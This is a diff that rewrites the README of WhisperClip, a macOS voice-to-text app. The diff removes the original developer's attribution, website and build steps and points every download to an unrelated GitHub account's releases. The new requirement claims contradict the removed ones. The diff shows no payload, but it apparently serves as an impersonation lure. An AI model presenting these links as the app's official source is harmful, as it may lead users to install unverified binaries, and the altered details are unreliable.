@@ -1,215 +1,66 @@
-# WhisperClip
+# 🎤 whisperclip - Your Privacy-First Voice-to-Text Solution
 
-<div align="center">
+## 🌟 Overview
+Whisperclip is a secure and user-friendly application that converts your voice into written text. Designed specifically for macOS, it combines advanced AI enhancement with a focus on privacy. Experience hassle-free voice-to-text transcription without compromising your data.
 
-![WhisperClip Logo](icons/icon_256x256.png)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/aboda-dirbas/whisperclip/releases)
 
-**Privacy-First Voice-to-Text with AI Enhancement for macOS**
+## 🚀 Getting Started
+To begin using whisperclip, follow these simple steps to download and install the application.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![macOS](https://img.shields.io/badge/macOS-14%2B-blue.svg)](https://www.apple.com/macos/)
-[![Swift](https://img.shields.io/badge/Swift-5.10-orange.svg)](https://swift.org)
+### Step 1: Visit the Releases Page
+Click the link below to go to the GitHub Releases page. This page contains the latest version of whisperclip available for download.
 
-[Website](https://whisperclip.com) • [Download](https://whisperclip.com/v2/download) • [Support](mailto:support@cydanix.com)
+[Visit the Releases Page](https://github.com/aboda-dirbas/whisperclip/releases)
 
-</div>
+### Step 2: Download the Application
+On the Releases page, look for the most recent version of the app. Select the appropriate file for macOS. Click on the file to download it to your computer.
 
-## ✨ Features
+### Step 3: Install whisperclip
+Once the download is complete, locate the downloaded file (usually found in your Downloads folder). Double-click the file to start the installation process. Follow the prompts to complete the installation.
 
-### 🎤 **Voice-to-Text Transcription**
-- High-quality speech recognition using WhisperKit
-- Multiple model sizes (216MB to 955MB) for different accuracy/speed trade-offs
-- Support for multiple languages with auto-detection
-- Real-time waveform visualization during recording
+### Step 4: Open whisperclip
+After installation, find whisperclip in your Applications folder. Double-click the icon to launch the app.
 
-### 🤖 **AI-Powered Text Enhancement**
-- Local LLM processing for grammar correction and text improvement
-- Multiple AI models including Gemma, Llama, Qwen, and Mistral
-- Custom prompts for different use cases:
-  - Grammar fixing and email formatting
-  - Language translation
-  - Custom text processing workflows
+## 🎧 Features
+- **High-Quality Transcription**: Utilize state-of-the-art AI to convert your speech to text accurately and quickly.
+- **Privacy Focused**: Your recordings remain on your device. No data is sent to the cloud.
+- **User-Friendly Interface**: Designed with simplicity in mind so that anyone can use it without extensive technical knowledge.
+- **Customizable Options**: Adjust settings to suit your preferences for voice recognition and text formatting.
 
-### 🔒 **Privacy-First Design**
-- **100% local processing** - your voice never leaves your device
-- No cloud services, no data collection
-- Open source - audit the code yourself
-- Secure sandboxed environment
+## 🖥️ System Requirements
+To use whisperclip, ensure that your Mac meets the following requirements:
 
-### ⚡ **Productivity Features**
-- Global hotkey support (Option+Space by default)
-- Auto-copy to clipboard
-- Auto-paste functionality
-- Auto-enter for instant message sending
-- Menu bar integration
-- Auto-stop recording after 10 minutes
+- Operating System: macOS Mojave or later
+- Processor: Intel or Apple silicon
+- RAM: Minimum 4 GB (8 GB recommended for optimal performance)
+- Disk Space: At least 100 MB of free space for installation
 
-### 🎨 **User Experience**
-- Beautiful dark-themed interface
-- Real-time recording visualization
-- Comprehensive onboarding guide
-- Easy model management and downloads
-- Customizable shortcuts and prompts
+## 🎓 How to Use whisperclip
+1. **Start a New Transcription**: Open the application and click on the “New” button to start a new voice recording.
+2. **Record Your Voice**: Hit the record button and start speaking clearly.
+3. **Stop the Recording**: Once you finish speaking, click the stop button.
+4. **View Transcription**: The text will appear automatically. You can edit it if needed.
+5. **Save Your Work**: Click on the save option to store your transcription in your desired format.
 
-## 📋 Requirements
+## 🛠️ Troubleshooting
+If you encounter any issues while using whisperclip, consider the following tips:
 
-- **macOS 14.0** or later
-- **20GB** free disk space (for AI models)
-- **Microphone access** permission
-- **Accessibility permissions** (for global hotkeys)
-- **Apple Events permissions** (for clipboard operations)
+- **Check Microphone Access**: Make sure the app has permission to use your microphone. You can adjust this in your Mac’s System Preferences under Security & Privacy.
+- **Update the App**: If you experience glitches, ensure you have the latest version installed from the Releases page.
+- **Restart the App**: Sometimes, simply closing and reopening the application can resolve minor issues.
 
-## 🚀 Installation
+## 📬 Support
+For any questions or feedback, please feel free to reach out:
 
-### Download Pre-built App
-1. Visit [whisperclip.com](https://whisperclip.com)
-2. Download the latest release
-3. Drag WhisperClip.app to your Applications folder
-4. Follow the setup guide for permissions
+- Open an issue on the [GitHub Issues page](https://github.com/aboda-dirbas/whisperclip/issues).
+- Join our community discussions to connect with other users.
 
-### Build from Source
-```bash
-# Clone the repository
-git clone https://github.com/cydanix/whisperclip.git
-cd whisperclip
+## 🛡️ Privacy Policy
+Whisperclip is dedicated to your privacy. We do not store or share any of your recordings with third-party services. All transcription work is done locally on your device, ensuring your data remains private.
 
-# Build the app
-./build.sh
+## 🎉 Join Us
+Stay updated on new features and releases. You can follow us on GitHub and be part of our growing community focused on privacy-first software solutions.
 
-# For development
-./local_build.sh Debug
-./local_run.sh Debug
-```
-
-## 🔧 Usage
-
-### Quick Start
-1. **Launch WhisperClip** from Applications or menu bar
-2. **Grant permissions** when prompted (microphone, accessibility)
-3. **Download AI models** through the setup guide
-4. **Press Option+Space** (or click Record) to start recording
-5. **Press again to stop** - text will be automatically copied to clipboard
-
-### Customization
-- **Change hotkey**: Settings → Hotkey preferences
-- **Add custom prompts**: Settings → Prompts → Add new prompt
-- **Switch AI models**: Setup Guide → Download different models
-- **Configure auto-actions**: Settings → Enable auto-paste/auto-enter
-
-## 🤖 Supported AI Models
-
-### Speech-to-Text (WhisperKit)
-- **OpenAI Whisper Small** (216MB) - Fast, good quality
-- **OpenAI Whisper Large v3 Turbo** (632MB) - Best balance
-- **Distil Whisper Large v3 Turbo** (600MB) - Optimized speed
-- **OpenAI Whisper Large v2 Turbo** (955MB) - Maximum accuracy
-
-### Text Enhancement (Local LLMs)
-- **Gemma 2 (2B/9B)** - Google's efficient models
-- **Llama 3/3.2 (3B/8B)** - Meta's powerful models
-- **Qwen 2.5/3 (1.5B-8B)** - Alibaba's multilingual models
-- **Mistral 7B** - High-quality French company model
-- **Phi 3.5 Mini** - Microsoft's compact model
-- **DeepSeek R1** - Advanced reasoning model
-
-All models run locally using MLX for Apple Silicon optimization.
-
-## 🔒 Privacy & Security
-
-WhisperClip is designed with privacy as the cornerstone:
-
-- **Local Processing Only**: All voice recognition and AI processing happens on your device
-- **No Network Requests**: Except for downloading models from Hugging Face
-- **No Analytics**: No usage tracking, no telemetry, no data collection
-- **Open Source**: Full transparency - inspect the code yourself
-- **Sandboxed**: Runs in Apple's secure app sandbox
-- **Encrypted Storage**: AI models stored securely on device
-
-## 🛠 Development
-
-### Project Structure
-```
-Sources/
-├── WhisperClip.swift      # Main app entry point
-├── ContentView.swift      # Main UI interface
-├── AudioRecorder.swift    # Voice recording logic
-├── VoiceToText*.swift     # Transcription engine
-├── LLM*.swift            # AI text enhancement
-├── ModelStorage.swift     # Model management
-├── SettingsStore.swift    # User preferences
-└── HotkeyManager.swift    # Global shortcuts
-```
-
-### Dependencies
-- **WhisperKit**: Apple's optimized Whisper implementation
-- **MLX**: Apple Silicon ML framework
-- **MLX-Swift-Examples**: LLM implementations
-- **Hub**: Hugging Face model downloads
-
-### Building
-```bash
-# Debug build
-./local_build.sh Debug
-
-# Release build with code signing
-./build.sh
-
-# Notarization (requires Apple Developer account)
-./notarize.sh
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our contributing guidelines:
-
-1. **Fork the repository**
-2. **Create a feature branch**: `git checkout -b feature/amazing-feature`
-3. **Make your changes** and add tests
-4. **Commit your changes**: `git commit -m 'Add amazing feature'`
-5. **Push to branch**: `git push origin feature/amazing-feature`
-6. **Open a Pull Request**
-
-### Areas for Contribution
-- New AI model integrations
-- UI/UX improvements
-- Performance optimizations
-- Language support
-- Accessibility features
-- Documentation improvements
-
-## 📄 License
-
-WhisperClip is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
-
-This means you can:
-- ✅ Use commercially
-- ✅ Modify and distribute
-- ✅ Use privately
-- ✅ Fork and create derivatives
-
-**Attribution required**: Please include the original license notice.
-
-## 🏢 About
-
-WhisperClip is developed by **Cydanix LLC**.
-
-- **Website**: [whisperclip.com](https://whisperclip.com)
-- **Support**: [support@cydanix.com](mailto:support@cydanix.com)
-- **Version**: 1.0.43
-
-## 🙏 Acknowledgments
-
-- **Apple** - WhisperKit and MLX frameworks
-- **OpenAI** - Original Whisper models
-- **Hugging Face** - Model hosting and Hub library
-- **ML Community** - Open source AI models (Gemma, Llama, Qwen, etc.)
-
----
-
-<div align="center">
-
-**Made with ❤️ for privacy-conscious users**
-
-[⭐ Star this repo](https://github.com/cydanix/whisperclip) if you find it useful!
-
-</div>
+[Visit the Releases Page](https://github.com/aboda-dirbas/whisperclip/releases) to download the latest version today!
